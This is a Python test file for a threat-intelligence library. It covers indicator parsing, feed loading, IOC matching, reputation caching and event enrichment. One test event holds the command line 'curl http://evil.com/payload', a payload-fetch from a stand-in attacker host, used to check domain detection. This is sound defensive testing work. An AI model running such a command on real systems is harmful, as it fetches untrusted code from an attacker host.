import json
import time
from pathlib import Path

import pytest

from threatpipe.intel import (
    IOC,
    IOCMatcher,
    IOCMeta,
    IOCStore,
    IOCType,
    ReputationCache,
    Reputation,
    enrich_event,
    load_feed,
    parse_ioc_type,
)
from threatpipe.ingestion import Event, EventType


# --- type inference ---

@pytest.mark.parametrize("value,expected", [
    ("1.2.3.4", IOCType.IP),
    ("1.2.3.4:53", IOCType.IP),
    ("evil.com", IOCType.DOMAIN),
    ("http://x.com/y", IOCType.URL),
    ("a" * 32, IOCType.HASH_MD5),
    ("a" * 40, IOCType.HASH_SHA1),
    ("a" * 64, IOCType.HASH_SHA256),
    ("alice@example.com", IOCType.EMAIL),
    ("HKLM\\Software\\Run", IOCType.REGISTRY),
])
def test_parse_ioc_type(value, expected):
    assert parse_ioc_type(value) == expected


def test_parse_ioc_type_returns_none_for_garbage():
    assert parse_ioc_type("nothing useful") is None


# --- normalization ---

def test_domain_normalization_strips_www():
    ioc = IOC(type=IOCType.DOMAIN, value="WWW.Evil.com")
    assert ioc.value == "evil.com"


def test_hash_normalization_lowercases():
    ioc = IOC(type=IOCType.HASH_SHA256, value="A" * 64)
    assert ioc.value == "a" * 64


def test_ip_normalization_strips_port():
    ioc = IOC(type=IOCType.IP, value="1.2.3.4:80")
    assert ioc.value == "1.2.3.4"


# --- store ---

def test_store_add_and_lookup():
    store = IOCStore()
    store.add(IOC(type=IOCType.IP, value="1.2.3.4", meta=IOCMeta(source="t")))
    assert store.lookup(IOCType.IP, "1.2.3.4") is not None
    assert store.lookup(IOCType.IP, "8.8.8.8") is None


def test_store_merge_takes_higher_confidence():
    store = IOCStore()
    store.add(IOC(type=IOCType.IP, value="1.2.3.4", meta=IOCMeta(source="a", confidence=0.6, threat_score=0.5, tags=("x",))))
    store.add(IOC(type=IOCType.IP, value="1.2.3.4", meta=IOCMeta(source="b", confidence=0.9, threat_score=0.7, tags=("y",))))
    merged = store.lookup(IOCType.IP, "1.2.3.4")
    assert merged.meta.confidence == 0.9
    assert merged.meta.threat_score == 0.7
    assert set(merged.meta.tags) == {"x", "y"}


def test_store_stats_groups_by_type_and_source():
    store = IOCStore()
    store.add(IOC(type=IOCType.IP, value="1.1.1.1", meta=IOCMeta(source="s1")))
    store.add(IOC(type=IOCType.DOMAIN, value="evil.com", meta=IOCMeta(source="s2")))
    stats = store.stats()
    assert stats["total"] == 2
    assert stats["by_type"]["ip"] == 1
    assert stats["by_source"]["s1"] == 1


# --- feed loaders ---

def test_json_feed_loader(tmp_path: Path):
    path = tmp_path / "feed.json"
    path.write_text(json.dumps({"iocs": [
        {"type": "ip", "value": "1.2.3.4"},
        {"type": "domain", "value": "evil.com", "threat_score": 0.9},
    ]}))
    iocs = list(load_feed(path))
    assert len(iocs) == 2


def test_jsonl_feed_loader_skips_garbage(tmp_path: Path):
    path = tmp_path / "feed.jsonl"
    path.write_text("\n".join([
        json.dumps({"type": "ip", "value": "1.2.3.4"}),
        "not-json",
        json.dumps({"type": "ip", "value": "5.6.7.8"}),
        "",
    ]))
    iocs = list(load_feed(path))
    assert len(iocs) == 2


def test_csv_feed_loader(tmp_path: Path):
    path = tmp_path / "feed.csv"
    path.write_text("value,type,threat_score,tags\n1.2.3.4,ip,0.9,c2;malware\nevil.com,domain,0.8,phish\n")
    iocs = list(load_feed(path))
    assert {ioc.value for ioc in iocs} == {"1.2.3.4", "evil.com"}


def test_hosts_feed_loader(tmp_path: Path):
    path = tmp_path / "feed.txt"
    path.write_text("# header\n0.0.0.0 evil.com\n1.2.3.4\n# comment\n")
    iocs = list(load_feed(path))
    types = {ioc.type for ioc in iocs}
    assert IOCType.DOMAIN in types
    assert IOCType.IP in types


def test_stix_lite_feed_loader(tmp_path: Path):
    path = tmp_path / "stix.stix"
    path.write_text(json.dumps({
        "indicators": [
            {"pattern": "[ipv4-addr:value = '1.2.3.4']", "labels": ["c2"], "confidence": 90},
            {"pattern": "[domain-name:value = 'evil.com']", "labels": ["phish"], "confidence": 85},
        ]
    }))
    iocs = list(load_feed(path))
    assert {(i.type.value, i.value) for i in iocs} == {("ip", "1.2.3.4"), ("domain", "evil.com")}


# --- matcher ---

def test_matcher_returns_none_when_no_match():
    store = IOCStore()
    matcher = IOCMatcher(store)
    ev = Event(host="h", dst_ip="8.8.8.8", event_type=EventType.NETWORK)
    assert matcher.detect(ev) is None


def test_matcher_hits_ip_field():
    store = IOCStore()
    store.add(IOC(type=IOCType.IP, value="1.2.3.4", meta=IOCMeta(source="t", threat_score=0.9)))
    matcher = IOCMatcher(store, min_score=0.1)
    ev = Event(host="h", dst_ip="1.2.3.4", event_type=EventType.NETWORK)
    det = matcher.detect(ev)
    assert det is not None
    assert det.score > 0.5


def test_matcher_extracts_domain_from_command_line():
    store = IOCStore()
    store.add(IOC(type=IOCType.DOMAIN, value="evil.com", meta=IOCMeta(source="t", threat_score=0.9)))
    matcher = IOCMatcher(store, min_score=0.1)
    ev = Event(command_line="curl http://evil.com/payload", event_type=EventType.PROCESS)
    det = matcher.detect(ev)
    assert det is not None


def test_matcher_hash_from_raw_field():
    h = "a" * 64
    store = IOCStore()
    store.add(IOC(type=IOCType.HASH_SHA256, value=h, meta=IOCMeta(source="t", threat_score=0.9)))
    matcher = IOCMatcher(store, min_score=0.1)
    ev = Event(event_type=EventType.FILE, raw={"hash": h})
    det = matcher.detect(ev)
    assert det is not None


# --- reputation cache ---

def test_reputation_cache_memoizes_resolver_results():
    calls = {"n": 0}

    def resolver(kind, value):
        calls["n"] += 1
        return Reputation(kind=kind, value=value, score=0.5, classification="suspicious", sources=("dns",))

    cache = ReputationCache(resolver=resolver, ttl_seconds=10.0)
    r1 = cache.resolve("ip", "1.2.3.4")
    r2 = cache.resolve("ip", "1.2.3.4")
    assert r1 is r2 or r1.value == r2.value
    assert calls["n"] == 1


def test_reputation_cache_evicts_when_full():
    cache = ReputationCache(resolver=None, max_entries=2)
    for i in range(3):
        cache.put(Reputation(kind="ip", value=f"{i}", score=0.5))
        time.sleep(0.001)
    assert len(cache) == 2


# --- enrichment ---

def test_enrich_event_attaches_ioc_hits():
    store = IOCStore()
    store.add(IOC(type=IOCType.IP, value="1.2.3.4", meta=IOCMeta(source="t")))
    ev = Event(host="h", dst_ip="1.2.3.4", event_type=EventType.NETWORK)
    payload = enrich_event(ev, store=store)
    assert payload["ioc_hits"]
    assert payload["ioc_hits"][0]["field"] == "dst_ip"
